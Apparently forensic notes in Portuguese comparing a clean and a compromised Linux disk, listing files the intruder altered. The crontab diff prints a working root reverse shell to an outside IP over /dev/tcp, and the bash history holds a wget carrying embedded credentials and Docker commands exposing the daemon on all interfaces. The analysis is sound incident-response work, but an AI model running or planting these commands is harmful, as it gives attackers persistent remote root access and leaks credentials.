usamos o comando diff entre os 2 discos: 
encontramos estas diferenças nos diretorios:

etc/crontab: na maquina hackeada foi acrescentada mais uma linha -> 
		
*/10 * * * * root 0<&196;exec 196<>/dev/tcp/96.127.23.115/5556; sh <&196 >&196 2>&196
													
------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	

etc/fstab: na maquina hackeada foram acrescentadas as seguintes linhas ->
			
# swap was on /dev/sda5 during installation
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
/dev/sr1        /media/cdrom1   udf,iso9660 user,noauto     0       0

------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	

etc/resolv.conf: na maquina hackeada foram alterados os servidores dns para :

domain home
search home
nameserver 192.168.50.100
nameserver 213.228.128.156
nameserver 213.228.128.5
													
------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	

home/dev: na maquina hackeada existe um ficheiro a mais =>.viminfo: alterações feitas atraves do vim? => dos mais recentes para os mais antigos.
Este ficheiro pode estar relacionado com o ficheiro bash_history. (encontra-se a seguir).
						# Viminfo version
						|1,4
						
						# Value of 'encoding' when this file was written
						*encoding=utf-8
						
						
						# hlsearch on (H) or off (h):
						~h
						# Command Line History (newest to oldest):
						:wq
						|2,0,1641492698,,"wq"
						
						# Search String History (newest to oldest):
						
						# Expression History (newest to oldest):
						
						# Input Line History (newest to oldest):
						
						# Debug Line History (newest to oldest):
						
						# Registers:
						
						# File marks:
						'0  21  0  ~/web/Dockerfile
						|4,48,21,0,1641492698,"~/web/Dockerfile"
						
						# Jumplist (newest first):
						-'  21  0  ~/web/Dockerfile
						|4,39,21,0,1641492698,"~/web/Dockerfile"
						-'  1  0  ~/web/Dockerfile
						|4,39,1,0,1641492689,"~/web/Dockerfile"
						
						# History of marks within files (newest to oldest):
						
						> ~/web/Dockerfile
							*	1641492697	0
							"	21	0
							^	21	1
							.	21	0
							+	20	0
							+	21	0
				
				
------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------		
				
home/dev:bash_history: este ficheiro estava vazio. Depois de hackeada o ficheiro tinha o seguinte conteúdo:(comandos feitos pelo hacker?)ele chama o vim. Daí o ficheiro viminfo falado anteriormente.

							docker stop app
							docker rm -f app
							docker rm -f app
							docker rm -f app
							ls
							vim entrypoint.sh 
							vim app.py 
							docker rm -f app
							docker rm -f app
							vim Dockerfile 
							docker rm -f app
							vim app.py 
							docker rm -f app
							vim auth.py 
							docker rm -f app
							vim auth.py 
							docker rm -f app
							vim auth.py 
							docker rm -f app
							vim auth.py 
							docker rm -f app
							docker rm -f app
							vim auth.py 
							docker rm -f app
							vim auth.py 
							docker rm -f app
							vim auth.py 
							vim app.py 
							vim auth.py 
							vim app.py 
							vim Dockerfile 
							ssh 192.168.1.10
							wget http://admin:75debe8ecad2b043072ce03d1dc3e635@192.168.1.21
							ls
							ls -la
							ls
							ls -la
							find .
							ls
							cd challenge/
							ls
							rm -rf __pycache__
							ls
							cd static/
							ls
							cd img/
							ls
							ls
							cd ..
							ls
							cd gallery/
							ls
							cat data 
							cd ..
							ls
							cd ..
							ls
							vim Dockerfile
							docker build app .
							docker build -t app .
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							vim Dockerfile
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							vim Dockerfile
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							vim requirements.txt
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							touch run.sh
							vim Dockerfile
							ls
							vim Dockerfile
							vim entrypoint.sh
							s
							vim Dockerfile 
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							vim Dockerfile 
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
							ls
							vim app.py 
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							docker rm -f app
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
							vim app.py 
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
							vim app.py 
							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
